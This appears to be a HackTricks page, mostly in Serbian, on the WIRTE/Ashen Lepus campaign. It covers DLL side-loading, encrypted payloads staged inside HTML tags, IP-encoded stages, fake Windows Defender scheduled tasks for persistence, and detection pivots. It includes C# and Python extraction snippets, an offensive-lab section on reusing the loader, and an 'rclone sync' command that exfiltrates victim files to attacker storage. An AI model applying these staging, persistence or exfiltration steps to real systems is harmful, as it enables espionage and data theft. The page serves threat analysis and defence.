# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) je weaponized ponovljiv obrazac koji povezuje DLL sideloading, staged HTML payloads i modularne .NET backdoors da bi opstao unutar diplomatskih mreža na Bliskom istoku. Ova tehnika je ponovo upotrebljiva za svakog operatora zato što se oslanja na:

- **Archive-based social engineering**: benigni PDF-ovi instruiraju mete da preuzmu RAR archive sa file-sharing sajta. Archive sadrži EXE za viewer dokumenta koji deluje legitimno, malicious DLL nazvan po trusted library (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), i mamac `Document.pdf`.
- **DLL search order abuse**: žrtva dvoklikne EXE, Windows reši DLL import iz current directory, a malicious loader (AshenLoader) se izvrši unutar trusted process dok se mamac PDF otvara da ne bi izazvao sumnju.
- **Living-off-the-land staging**: svaka kasnija faza (AshenStager → AshenOrchestrator → modules) ostaje van diska dok nije potrebna, isporučena kao encrypted blobovi sakriveni unutar inače bezopasnih HTML response-ova.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loaduje AshenLoader, koji radi host recon, AES-CTR ga enkriptuje i POST-uje ga unutar rotating parameters kao što su `token=`, `id=`, `q=`, ili `auth=` ka API-looking putanjama (npr. `/api/v2/account`).
2. **HTML extraction**: C2 odaje sledeću fazu samo kada se client IP geolocira u target region i `User-Agent` odgovara implant-u, što frustrira sandboxes. Kada provere prođu, HTTP body sadrži `<headerp>...</headerp>` blob sa Base64/AES-CTR encrypted AshenStager payload-om.
3. **Second sideload**: AshenStager se deploy-uje sa još jednim legitimate binary koji importuje `wtsapi32.dll`. Malicious copy injektovan u binary preuzima više HTML-a, ovoga puta izdvajajući `<article>...</article>` da bi se oporavio AshenOrchestrator.
4. **AshenOrchestrator**: modular .NET controller koji dekodira Base64 JSON config. Polja `tg` i `au` iz config-a se konkateniraju/heshuju u AES key, koji dekriptuje `xrk`. Rezultujući bytes služe kao XOR key za svaki module blob preuzet nakon toga.
5. **Module delivery**: svaki module je opisan kroz HTML comments koji preusmeravaju parser na proizvoljan tag, rušeći statička pravila koja gledaju samo na `<headerp>` ili `<article>`. Modules uključuju persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), i file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Čak i ako branioci blokiraju ili uklone određeni element, operateru je dovoljno da promeni tag nagovešten u HTML komentaru da bi nastavio isporuku.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Nedavna istraživanja HTML smuggling-a (Talos) ističu payload-e sakrivene kao Base64 stringovi unutar `<script>` blokova u HTML attachment-ima i dekodirane putem JavaScript-a u runtime-u. Isti trik može da se ponovo iskoristi za C2 responses: stage-ovati enkriptovane blob-ove unutar script taga (ili drugog DOM elementa) i dekodirati ih in-memory pre AES/XOR, tako da stranica izgleda kao običan HTML. Talos takođe pokazuje slojevitu obfuskaciju (preimenovanje identifikatora plus Base64/Caesar/AES) unutar script tagova, što se direktno preslikava na HTML-staged C2 blob-ove. Kasniji Talos writeup o **hidden text salting** je takođe relevantan ovde: deljenje Base64 sa nebitnim HTML komentarima ili whitespace-om dovoljno je da se pokvare jednostavni regex extractor-i, dok je rekonstrukcija na browser strani trivialna.

## Recent Variant Notes (2024-2025)

- Check Point je uočio WIRTE kampanje u 2024. koje su i dalje počivale na archive-based sideloading-u, ali su koristile `propsys.dll` (stagerx64) kao prvu fazu. Stager dekodira sledeći payload pomoću Base64 + XOR (key `53`), šalje HTTP requests sa hardcoded `User-Agent`, i izvlači enkriptovane blob-ove ugrađene između HTML tagova. U jednoj grani, stage je rekonstruisan iz dugačke liste ugrađenih IP stringova dekodiranih preko `RtlIpv4StringToAddressA`, a zatim konkateniranih u payload bajtove.
- OWN-CERT je dokumentovao raniji WIRTE tooling gde je side-loaded `wtsapi32.dll` dropper štitio stringove sa Base64 + TEA i koristio samo ime DLL-a kao decryption key, a zatim XOR/Base64-obfuskovao host identification podatke pre slanja na C2.

## Reconstructing IP-Encoded Stages

WIRTE-ova 2024 `propsys.dll` grana pokazuje da naredni PE ne mora da postoji kao jedan kontinuiran HTML blob. Loader može da smesti stage bajtove kao dotted-quad stringove i ponovo ih izgradi pomoću `RtlIpv4StringToAddressA`, što je obrazac blisko povezan sa Hive-ovim **IPfuscation** tradecraft-om. Operativno, ovo je korisno kada actor želi da HTML stranica sadrži nešto što izgleda kao bezazleni IOCs ili config data umesto očiglednog Base64 payload-a.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Ako oporavljeni bajtovi počinju sa `MZ`, verovatno ste direktno rekonstruisali sledeći PE. Ako ne, proverite da li postoji vodeći XOR/Base64 sloj ili mali delimiter fragmenti između adresa.

## Zamenljiva imena DLL-ova i rotacija hostova

Jake osobine ovog obrasca su da **HTML/AES/XOR staging backend može ostati identičan dok se menja samo sideload par**. WIRTE je tokom kampanja rotirao kroz `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, i `propsys.dll`, što je korisno jer:

- `propsys.dll` i `wtsapi32.dll` su dosadna Windows DLL imena za koja defanzivci očekuju da postoje u `%System32%` / `%SysWOW64%`.
- Javni katalozi kao što je **HijackLibs** već mapiraju mnoge binarne fajlove koji će učitati ta DLL imena iz kopiranog direktorijuma aplikacije, dajući operaterima zamenske hostove bez redizajna stagera.
- Samo export surface mora da se prilagodi po hostu. HTML parser, AES/XOR rutine i module loader obično mogu nepromenjeni da se prebace u forwarding proxy DLL.

Za ofanzivni laboratorijski rad, ovo znači da možete podeliti problem na **(1) pronaći stabilan potpisan host koji lokalno rešava vaše izabrano ime DLL-a** i **(2) ponovo koristiti istu staged-HTML loader logiku iza tog DLL-a**.

## Kriptografija i C2 hardening

- **AES-CTR svuda**: trenutni loaderi ugrađuju 256-bitne ključeve plus nonce-ove (npr. `{9a 20 51 98 ...}`) i opciono dodaju XOR sloj koristeći stringove kao što je `msasn1.dll` pre/posle dekripcije.
- **Varijacije materijala za ključeve**: raniji loaderi su koristili Base64 + TEA za zaštitu ugrađenih stringova, pri čemu je ključ za dekripciju bio izveden iz zlonamernog imena DLL-a (npr. `wtsapi32.dll`).
- **Podeljena infrastruktura + kamuflaža poddomenima**: staging serveri su odvojeni po alatu, hostovani preko različitih ASN-ova, i ponekad postavljeni iza poddomena koji izgledaju legitimno, tako da sagorevanje jednog stage-a ne otkriva ostale.
- **Švercovanje rekona**: enumerisani podaci sada uključuju liste iz Program Files da bi se uočile aplikacije visoke vrednosti i uvek su šifrovani pre nego što napuste host.
- **Promena URI-ja**: query parametri i REST putanje rotiraju između kampanja (`/api/v1/account?token=` → `/api/v2/account?auth=`), čime se poništavaju krhke detekcije.
- **Zakucani User-Agent + bezbedni redirect-i**: C2 infrastruktura odgovara samo na tačne UA stringove, a u suprotnom preusmerava na bezopasne news/health sajtove da bi se stopila sa prometom.
- **Kontrolisana isporuka**: serveri su geo-fencovani i odgovaraju samo pravim implantima. Neodobreni klijenti dobijaju neupadljiv HTML.

## Persistencija i petlja izvršavanja

AshenStager postavlja scheduled tasks koji se maskiraju kao Windows maintenance poslovi i izvršavaju preko `svchost.exe`, npr.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ovi zadaci ponovo pokreću sideloading lanac pri podizanju sistema ili u intervalima, obezbeđujući da AshenOrchestrator može da traži sveže module bez ponovnog dodirivanja diska.

## Korišćenje benignih sync klijenata za exfiltraciju

Operateri postavljaju diplomatske dokumente unutar `C:\Users\Public` (čitljivo svima i neupadljivo) preko posebnog modula, a zatim preuzimaju legitimni [Rclone](https://rclone.org/) binarni fajl da sinhronizuju taj direktorijum sa skladištem napadača. Unit42 napominje da je ovo prvi put da je ovaj akter posmatran kako koristi Rclone za exfiltraciju, što je u skladu sa širim trendom zloupotrebe legitimnih sync alata da bi se uklopili u normalan saobraćaj:

1. **Stage**: kopirajte/prikupite ciljane fajlove u `C:\Users\Public\{campaign}\`.
2. **Configure**: pošaljite Rclone konfiguraciju koja pokazuje na HTTPS endpoint pod kontrolom napadača (npr. `api.technology-system[.]com`).
3. **Sync**: pokrenite `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` tako da saobraćaj liči na normalne cloud backup-e.

Pošto se Rclone široko koristi za legitimne backup tokove, defanzivci moraju da se fokusiraju na anomalna izvršavanja (novi binarni fajlovi, čudni remotes, ili nagla sinhronizacija iz `C:\Users\Public`).

## Detekcioni pivoti

- Alarmirajte na **potpisane procese** koji neočekivano učitavaju DLL-ove iz putanja koje korisnik može da upisuje (Procmon filteri + `Get-ProcessMitigation -Module`), posebno kada se imena DLL-ova preklapaju sa `netutils`, `srvcli`, `dwampi`, `wtsapi32`, ili `propsys`.
- Pregledajte sumnjive HTTPS odgovore na **velike Base64 blobove ugnježdene unutar neuobičajenih tagova** ili zaštićene komentarima `<!-- TAG: <xyz> -->`.
- Prvo normalizujte HTML: **uklonite komentare i sabijte whitespace pre Base64 ekstrakcije**, jer evasion u stilu hidden-text-salting može da podeli payload preko granica komentara.
- Proširite HTML hunting i na **Base64 stringove unutar `<script>` blokova** (HTML smuggling-style staging) koji se dekodiraju preko JavaScript pre AES/XOR obrade.
- Tražite ponovljene pozive **`RtlIpv4StringToAddressA` praćene sklapanjem bafera**, posebno kada su okolni stringovi duge IPv4 liste, a ne stvarne mrežne mete.
- Tražite **scheduled tasks** koji pokreću `svchost.exe` sa argumentima koji nisu servisni ili koji upućuju nazad na dropper direktorijume.
- Pratite **C2 redirect-e** koji vraćaju payload samo za tačne `User-Agent` stringove, a inače preusmeravaju na legitimne news/health domene.
- Pratite pojavu **Rclone** binarnih fajlova van IT upravljanih lokacija, novih `rclone.conf` fajlova, ili sync poslova koji povlače iz staging direktorijuma kao što je `C:\Users\Public`.

## Reference

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
